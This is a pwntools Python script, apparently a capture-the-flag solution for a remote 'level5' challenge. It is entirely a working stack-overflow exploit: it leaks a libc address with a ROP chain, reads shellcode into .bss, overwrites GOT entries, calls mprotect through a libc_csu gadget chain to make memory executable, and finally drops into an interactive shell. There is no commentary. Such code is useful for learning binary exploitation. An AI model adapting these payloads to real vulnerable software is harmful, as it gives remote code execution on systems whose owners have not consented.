from pwn import *

conn = remote('pwn2.jarvisoj.com',9884)
libc = ELF('./libc-2.19.so')
elf = ELF('./level5')

write_plt = elf.symbols['write']
write_got  = elf.got['write']
read_plt = elf.symbols['read']
main_addr = elf.symbols['main']
vul_addr = elf.symbols['vulnerable_function']
bss_addr = elf.bss()

pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1

start_addr = 0x00000000004006A6
end_addr = 0x0000000000400690

payload1 = 'a' * 0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + 'c' * 8  + p64(write_plt) + p64(vul_addr)
conn.recvuntil('\n')
conn.send(payload1)
write_addr = u64(conn.recv(8))
offset = write_addr - libc.symbols['write']
mprotect_addr = offset + libc.symbols['mprotect']

payload2 = 'a' * 0x88 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_addr) + 'c' * 8 + p64(read_plt) + p64(vul_addr)
conn.recvuntil('\n')
conn.send(payload2)
conn.send(asm(shellcraft.amd64.linux.sh(), arch = 'amd64'))

mprotect_got =0x0000000000600A48
bss_got = 0x0000000000600A50

payload3 = 'a' * 0x88  + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_got) + 'c' * 8 + p64(read_plt) + p64(vul_addr)
conn.recvuntil('\n')
conn.send(payload3)
conn.send(p64(bss_addr))

payload4 = 'a' * 0x88  + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(mprotect_got) + 'c' * 8 + p64(read_plt) + p64(vul_addr)
conn.recvuntil('\n')
conn.send(payload4)
conn.send(p64(mprotect_addr))

payload5 = 'a' * 0x88 + p64(start_addr) + 'b' * 8 + p64(0) + p64(1) + p64(mprotect_got) + p64(7) + p64(0x1000) + p64(0x600000) + p64(end_addr)
payload5 += 'b' * 8 + p64(0) + p64(1) + p64(bss_got) + p64(0)  + p64(0) + p64(0) + p64(end_addr)
conn.recvuntil('\n')
conn.send(payload5)

conn.interactive()